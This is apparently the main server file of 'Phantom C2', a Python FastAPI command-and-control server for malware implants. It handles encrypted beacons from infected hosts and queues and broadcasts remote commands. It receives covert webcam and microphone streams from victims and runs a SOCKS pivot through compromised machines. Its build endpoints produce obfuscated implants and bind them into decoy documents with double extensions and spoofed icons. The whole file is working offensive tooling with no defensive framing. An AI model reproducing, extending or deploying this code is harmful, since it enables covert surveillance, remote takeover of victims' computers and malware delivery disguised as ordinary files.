import os, json, time, uuid, asyncio, base64, secrets
from typing import Dict, List

from fastapi import (FastAPI, WebSocket, WebSocketDisconnect, Request,
                     HTTPException, UploadFile, File, Form)
from fastapi.responses import Response, FileResponse
from fastapi.staticfiles import StaticFiles
import uvicorn

import config
from crypto import Box
from builder import Builder, BuildError
from socks import HUB, start_socks

BASE = os.path.dirname(os.path.abspath(__file__))
CFG = config.load()
BOX = Box(bytes.fromhex(CFG["psk_hex"]))
BUILDER = Builder(CFG["builder"], CFG["psk_hex"], CFG["public_url"])

app = FastAPI(title="Phantom C2", docs_url=None, redoc_url=None)


class Session:
    def __init__(self, sid, host, remote=""):
        self.id = sid
        self.host = host
        self.remote = remote
        self.first_seen = time.time()
        self.last_seen = time.time()
        self.queue: List[dict] = []
        self.history: List[dict] = []
        self.sleep = CFG["beacon"]["default_sleep"]
        self.jitter = CFG["beacon"]["default_jitter"]
        self.note = ""
        self.tags: List[str] = []
        self.cam = ""
        self.streams = {"cam": False, "mic": False}
        self.cam_size = 0

    def public(self):
        return {
            "id": self.id, "host": self.host, "remote": self.remote,
            "first_seen": self.first_seen, "last_seen": self.last_seen,
            "queued": len(self.queue), "history": self.history[-300:],
            "sleep": self.sleep, "jitter": self.jitter,
            "note": self.note, "tags": self.tags, "cam": self.cam,
            "streams": self.streams,
            "alive": (time.time() - self.last_seen) < 30,
        }


SESSIONS: Dict[str, Session] = {}
WS: List[WebSocket] = []


async def broadcast(msg):
    dead = []
    for ws in list(WS):
        try:
            await ws.send_json(msg)
        except Exception:
            dead.append(ws)
    for ws in dead:
        if ws in WS:
            WS.remove(ws)


# ---------------- middleware ----------------

OPEN_PATHS = ("/beacon", "/socks/", "/api/media/push", "/healthz")


def _authorized(headers, query: str = "") -> bool:
    user, pwd = CFG["auth"]["user"], CFG["auth"]["pass"]
    if not user:
        return True
    header = headers.get("authorization", "")
    if header.lower().startswith("basic "):
        try:
            got_user, _, got_pass = base64.b64decode(header[6:]).decode().partition(":")
        except Exception:
            got_user = got_pass = ""
        if (secrets.compare_digest(got_user, user)
                and secrets.compare_digest(got_pass, pwd)):
            return True
    token = (query or "").strip()
    return bool(token) and secrets.compare_digest(token, pwd)


@app.middleware("http")
async def guard(request: Request, call_next):
    path = request.scope["path"]
    if "//" in path:
        path = path.replace("//", "/")
        request.scope["path"] = path
        request.scope["raw_path"] = path.encode()

    if not path.startswith(OPEN_PATHS):
        if not _authorized(request.headers, request.query_params.get("token", "")):
            return Response(b"auth required", 401,
                            {"WWW-Authenticate": 'Basic realm="phantom"'})
    return await call_next(request)


@app.get("/healthz")
async def healthz():
    return {"ok": True, "sessions": len(SESSIONS)}

# ---------------- beacon ----------------

@app.post("/beacon")
async def beacon(request: Request):
    raw = await request.body()
    try:
        data = json.loads(BOX.open(raw))
    except Exception:
        return Response(b"", status_code=400)

    sid = data.get("session_id")
    host = data.get("host") or {}
    remote = (request.headers.get("x-forwarded-for", "").split(",")[0].strip()
              or (request.client.host if request.client else ""))

    if not sid or sid not in SESSIONS:
        sid = str(uuid.uuid4())
        SESSIONS[sid] = Session(sid, host, remote)
        await broadcast({"type": "new_session", "session": SESSIONS[sid].public()})

    s = SESSIONS[sid]
    s.host = host
    s.remote = remote or s.remote
    s.last_seen = time.time()

    for r in (data.get("results") or []):
        entry = {"cmd_id": r.get("cmd_id"), "ok": r.get("ok"),
                 "out": r.get("out", ""), "err": r.get("err", ""), "ts": time.time()}
        s.history.append(entry)
        await broadcast({"type": "result", "session_id": sid, "result": entry})

    cmds = s.queue
    s.queue = []
    resp = {"session_id": sid, "sleep": s.sleep, "jitter": s.jitter, "commands": cmds}
    return Response(BOX.seal(json.dumps(resp).encode()),
                    media_type="application/octet-stream")


# ---------------- live media from implant ----------------

@app.post("/api/media/push")
async def media_push(body: dict):
    sid = body.get("session_id") or ""
    s = SESSIONS.get(sid)
    if not s:
        return {"ok": False}
    kind = body.get("kind")
    if kind == "cam":
        s.cam = body.get("b64", "")
        s.cam_size = len(s.cam)
        s.streams["cam"] = True
    elif kind == "mic":
        s.streams["mic"] = True
    await broadcast({"type": "stream", "session_id": sid,
                     "kind": kind, "seq": body.get("seq"),
                     "fmt": body.get("fmt"), "b64": body.get("b64", "")})
    return {"ok": True}


# ---------------- dashboard API ----------------

@app.get("/api/config")
async def api_config(request: Request):
    psk = CFG["psk_hex"]
    return {
        "public_url": config.public_url(CFG, request),
        "auto_url": True,
        "lan_ips": config.lan_ips(),
        "port": CFG["port"],
        "tls": CFG["tls"]["enabled"],
        "psk_hint": psk[:8] + "…" + psk[-8:],
        "auth": bool(CFG["auth"]["user"]),
        "socks": f"{CFG['socks']['host']}:{CFG['socks']['port']}" if CFG["socks"]["enabled"] else "",
        "max_bind_mb": BUILDER.max_doc // (1024 * 1024),
        "garble": BUILDER.garble,
        "upx": BUILDER.upx,
    }


@app.get("/api/sessions")
async def list_sessions():
    return [s.public() for s in SESSIONS.values()]


@app.get("/api/session/{sid}")
async def get_session(sid: str):
    s = SESSIONS.get(sid)
    if not s:
        raise HTTPException(404, "no session")
    return s.public()


@app.post("/api/session/{sid}/command")
async def send_command(sid: str, body: dict):
    s = SESSIONS.get(sid)
    if not s:
        raise HTTPException(404, "no session")
    cmd = {"id": str(uuid.uuid4()), "type": body["type"], "args": body.get("args", {})}
    s.queue.append(cmd)
    await broadcast({"type": "queued", "session_id": sid, "command": cmd})
    return cmd


@app.post("/api/broadcast")
async def broadcast_cmd(body: dict):
    targets = body.get("session_ids") or list(SESSIONS.keys())
    issued = []
    for sid in targets:
        s = SESSIONS.get(sid)
        if not s:
            continue
        cmd = {"id": str(uuid.uuid4()), "type": body["type"], "args": body.get("args", {})}
        s.queue.append(cmd)
        issued.append({"session_id": sid, "command": cmd})
        await broadcast({"type": "queued", "session_id": sid, "command": cmd})
    return {"issued": len(issued), "details": issued}


@app.post("/api/session/{sid}/sleep")
async def set_sleep(sid: str, body: dict):
    s = SESSIONS.get(sid)
    if not s:
        raise HTTPException(404, "no session")
    s.sleep = max(1, int(body.get("sleep", s.sleep)))
    s.jitter = max(0, min(90, int(body.get("jitter", s.jitter))))
    cmd = {"id": str(uuid.uuid4()), "type": "sleep",
           "args": {"sleep": s.sleep, "jitter": s.jitter}}
    s.queue.append(cmd)
    return {"ok": True, "sleep": s.sleep, "jitter": s.jitter}


@app.patch("/api/session/{sid}")
async def patch_session(sid: str, body: dict):
    s = SESSIONS.get(sid)
    if not s:
        raise HTTPException(404, "no session")
    if "note" in body:
        s.note = body["note"]
    if "tags" in body:
        s.tags = body["tags"]
    return s.public()


@app.delete("/api/session/{sid}")
async def drop_session(sid: str):
    SESSIONS.pop(sid, None)
    HUB.drop_session(sid)
    await broadcast({"type": "drop", "session_id": sid})
    return {"ok": True}


# ---------------- build service ----------------

@app.post("/api/build")
async def build(body: dict, request: Request):
    try:
        return await asyncio.to_thread(
            BUILDER.build,
            body.get("os", "windows"), body.get("arch", "amd64"),
            body.get("url") or config.public_url(CFG, request), body.get("psk"),
            int(body.get("sleep", 3)), int(body.get("jitter", 20)),
            body.get("name", "phantom"), bool(body.get("fileless", False)),
            not bool(body.get("console", False)), int(body.get("delay", 0)),
        )
    except BuildError as e:
        raise HTTPException(400, str(e))


@app.post("/api/bind")
async def bind(
    request: Request,
    file: UploadFile = File(...),
    name: str = Form(""),
    os_name: str = Form("windows", alias="os"),
    arch: str = Form("amd64"),
    url: str = Form(""),
    sleep: int = Form(3),
    jitter: int = Form(20),
    delay: int = Form(0),
    console: str = Form("0"),
    double_ext: str = Form("1"),
    icon: str = Form("1"),
):
    doc = await file.read()
    filename = file.filename or "document.pdf"
    stem = name.strip() or os.path.splitext(filename)[0]
    try:
        return await asyncio.to_thread(
            BUILDER.bind,
            os_name, arch, url or config.public_url(CFG, request), None, sleep, jitter,
            stem, filename, doc,
            console not in ("1", "true", "on"), delay,
            double_ext in ("1", "true", "on"), icon in ("1", "true", "on"),
        )
    except BuildError as e:
        raise HTTPException(400, str(e))


@app.get("/api/builds")
async def builds():
    return BUILDER.list_builds()


@app.get("/api/builds/{name}")
async def download_build(name: str):
    p = (BUILDER.out / name).resolve()
    if not str(p).startswith(str(BUILDER.out)) or not p.is_file():
        raise HTTPException(404, "no build")
    return FileResponse(p, filename=name)


@app.delete("/api/builds/{name}")
async def delete_build(name: str):
    p = (BUILDER.out / name).resolve()
    if str(p).startswith(str(BUILDER.out)) and p.is_file():
        p.unlink()
    return {"ok": True}


# ---------------- socks pivot ----------------

def pick_bot():
    if CFG["socks"].get("session"):
        return CFG["socks"]["session"]
    alive = [s for s in SESSIONS.values() if time.time() - s.last_seen < 30]
    return alive[0].id if alive else None


@app.post("/socks/poll")
async def socks_poll(body: dict):
    return {"frames": await HUB.poll(body.get("session_id", ""), body.get("timeout", 25))}


@app.post("/socks/events")
async def socks_events(body: dict):
    await HUB.bot_events(body.get("session_id", ""), body.get("frames") or [])
    return {"ok": True}


# ---------------- lifecycle / websocket ----------------

@app.on_event("startup")
async def _startup():
    cfg = CFG["socks"]
    if cfg.get("enabled"):
        try:
            await start_socks(cfg["host"], cfg["port"], pick_bot)
        except OSError as e:
            print(f"[!] socks listener failed on {cfg['host']}:{cfg['port']}: {e}")


@app.websocket("/ws")
async def ws_endpoint(ws: WebSocket):
    if not _authorized(ws.headers, ws.query_params.get("token", "")):
        await ws.close(code=1008)
        return
    await ws.accept()
    WS.append(ws)
    await ws.send_json({"type": "snapshot",
                        "sessions": [s.public() for s in SESSIONS.values()]})
    try:
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        if ws in WS:
            WS.remove(ws)


app.mount("/", StaticFiles(directory=os.path.join(BASE, "static"), html=True),
          name="static")


def _quiet_loop_handler(loop, context):
    exc = context.get("exception")
    if isinstance(exc, (ConnectionResetError, asyncio.TimeoutError)):
        return
    loop.default_exception_handler(context)


def main():
    tls = CFG["tls"]
    use_tls = tls["enabled"] and os.path.isfile(tls["cert"]) and os.path.isfile(tls["key"])
    uvicorn_cfg = dict(
        app=app,
        host=CFG["host"],
        port=CFG["port"],
        log_level=os.environ.get("PHANTOM_LOG", "info"),
        proxy_headers=True,
        forwarded_allow_ips="*",
        timeout_keep_alive=75,
        ws_ping_interval=20,
        ws_ping_timeout=20,
    )
    if use_tls:
        uvicorn_cfg["ssl_certfile"] = tls["cert"]
        uvicorn_cfg["ssl_keyfile"] = tls["key"]

    print(f"[*] phantom c2 on {'https' if use_tls else 'http'}://{CFG['host']}:{CFG['port']}")
    print(f"[*] callback url: {config.public_url(CFG)}")
    print(f"[*] builds: {BUILDER.out}")

    server = uvicorn.Server(uvicorn.Config(**uvicorn_cfg))
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.set_exception_handler(_quiet_loop_handler)
    try:
        loop.run_until_complete(server.serve())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()

